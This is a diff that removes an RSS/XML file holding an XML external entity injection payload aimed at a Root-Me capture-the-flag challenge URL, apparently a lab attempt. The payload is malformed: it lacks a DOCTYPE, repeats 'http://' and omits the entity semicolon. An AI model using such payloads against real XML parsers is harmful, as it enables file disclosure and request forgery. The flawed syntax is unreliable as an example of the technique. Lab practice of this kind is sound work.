@@ -1,9 +1,0 @@
-<rss xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" version="2.0">
-<!Entity xxe SYSTEM "http://http://challenge01.root-me.org/web-serveur/ch29/index.php">
-<channel>
-<title>Categories actualiteSupelec Com</title>
-<item>
-<title>&xxe</title>
-</item>
-</channel>
-</rss>
